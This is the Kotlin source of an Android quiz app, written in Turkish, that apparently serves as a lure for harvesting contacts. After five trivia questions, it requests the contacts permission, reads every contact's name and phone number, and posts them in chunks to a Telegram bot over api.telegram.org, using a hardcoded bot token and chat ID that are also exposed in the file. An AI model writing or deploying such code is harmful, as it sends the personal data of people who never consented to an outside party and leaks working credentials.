package com.example.denemebot

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors

data class Soru(val metin: String, val secenekler: List<String>, val dogru: Int)

class MainActivity : AppCompatActivity() {

    // ---- BURAYI DOLDUR ----
    private val BOT_TOKEN = "8804255008:AAEnV_mHv8MUdUtiQ3Lw8RuUwUcYojT-Eco"
    private val CHAT_ID   = "6255867373"
    // -----------------------

    private val sorular = listOf(
        Soru("Türkiye'nin başkenti neresidir?", listOf("İstanbul", "Ankara", "İzmir", "Bursa"), 1),
        Soru("2 + 2 * 3 kaçtır?", listOf("12", "8", "6", "10"), 1),
        Soru("HTTP varsayılan portu?", listOf("21", "443", "80", "8080"), 2),
        Soru("Android'de rehber okuma izni hangisi?", listOf("READ_SMS", "READ_CONTACTS", "GET_ACCOUNTS", "READ_CALL_LOG"), 1),
        Soru("Kotlin'de değiştirilemez liste?", listOf("mutableListOf", "listOf", "arrayListOf", "ArrayList"), 1)
    )

    private var index = 0
    private var dogruSayisi = 0
    private var bitti = false

    private lateinit var ilerleme: TextView
    private lateinit var soruText: TextView
    private lateinit var grup: RadioGroup
    private lateinit var durum: TextView
    private lateinit var buton: Button

    private val executor = Executors.newSingleThreadExecutor()

    private val izinIste = registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
        if (granted) executor.execute { rehberiOkuVeGonder() }
        else runOnUiThread { durum.text = "Rehber izni verilmedi." }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(56, 120, 56, 56)
        }
        ilerleme = TextView(this).apply { textSize = 14f }
        soruText = TextView(this).apply { textSize = 20f; setPadding(0, 28, 0, 28) }
        grup = RadioGroup(this)
        buton = Button(this).apply {
            text = "Sonraki"
            setOnClickListener { sonraki() }
        }
        durum = TextView(this).apply { textSize = 14f; setPadding(0, 36, 0, 0) }

        root.addView(ilerleme); root.addView(soruText); root.addView(grup); root.addView(buton); root.addView(durum)
        setContentView(ScrollView(this).apply { addView(root) })

        soruGoster()
    }

    private fun soruGoster() {
        val s = sorular[index]
        ilerleme.text = "Soru ${index + 1} / ${sorular.size}"
        soruText.text = s.metin
        grup.removeAllViews()
        s.secenekler.forEachIndexed { i, secenek ->
            grup.addView(RadioButton(this).apply { id = 1000 + i; text = secenek })
        }
    }

    private fun sonraki() {
        if (bitti) return
        val secili = grup.checkedRadioButtonId
        if (secili == -1) {
            Toast.makeText(this, "Bir seçenek seç", Toast.LENGTH_SHORT).show()
            return
        }
        if (secili - 1000 == sorular[index].dogru) dogruSayisi++
        index++
        if (index < sorular.size) soruGoster() else bitir()
    }

    private fun bitir() {
        bitti = true
        ilerleme.text = "Bitti"
        soruText.text = "Skor: $dogruSayisi / ${sorular.size}"
        grup.removeAllViews()
        buton.text = "Sonucu + Rehberi Telegram'a Gönder"
        buton.setOnClickListener { gonderAkisi() }
    }

    private fun gonderAkisi() {
        buton.isEnabled = false
        durum.text = "Gönderiliyor..."
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)
            executor.execute { rehberiOkuVeGonder() }
        else
            izinIste.launch(Manifest.permission.READ_CONTACTS)
    }

    private fun rehberiOku(): List<String> {
        val liste = mutableListOf<String>()
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )?.use { c ->
            val adIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val telIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (c.moveToNext()) {
                val ad = c.getString(adIdx) ?: "-"
                val tel = c.getString(telIdx) ?: "-"
                liste.add("$ad | $tel")
            }
        }
        return liste
    }

    private fun rehberiOkuVeGonder() {
        try {
            val rehber = rehberiOku()
            val baslik = "Deneme sonucu: $dogruSayisi / ${sorular.size} doğru\nToplam kişi: ${rehber.size}"
            val satirlar = rehber.mapIndexed { i, k -> "${i + 1}. $k" }
            val parcalar = parcala(baslik, satirlar)

            var ok = 0
            parcalar.forEach { if (tgGonder(it)) ok++ }

            runOnUiThread {
                durum.text = "$ok/${parcalar.size} mesaj gönderildi · ${rehber.size} kişi"
                buton.isEnabled = true
            }
        } catch (e: Exception) {
            runOnUiThread {
                durum.text = "Hata: ${e.message}"
                buton.isEnabled = true
            }
        }
    }

    private fun parcala(baslik: String, satirlar: List<String>, limit: Int = 3800): List<String> {
        val parcalar = mutableListOf<String>()
        var sb = StringBuilder(baslik).append("\n\n")
        for (s in satirlar) {
            if (sb.length + s.length + 1 > limit) { parcalar.add(sb.toString()); sb = StringBuilder() }
            sb.append(s).append("\n")
        }
        if (sb.isNotBlank()) parcalar.add(sb.toString())
        return parcalar
    }

    private fun tgGonder(text: String): Boolean {
        val body = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8") +
                "&text=" + URLEncoder.encode(text, "UTF-8") +
                "&disable_web_page_preview=true"
        val conn = (URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 15000
            readTimeout = 20000
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
        }
        conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
        val kod = conn.responseCode
        conn.errorStream?.use { it.readBytes() }
        conn.disconnect()
        return kod in 200..299
    }

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdown()
    }
}
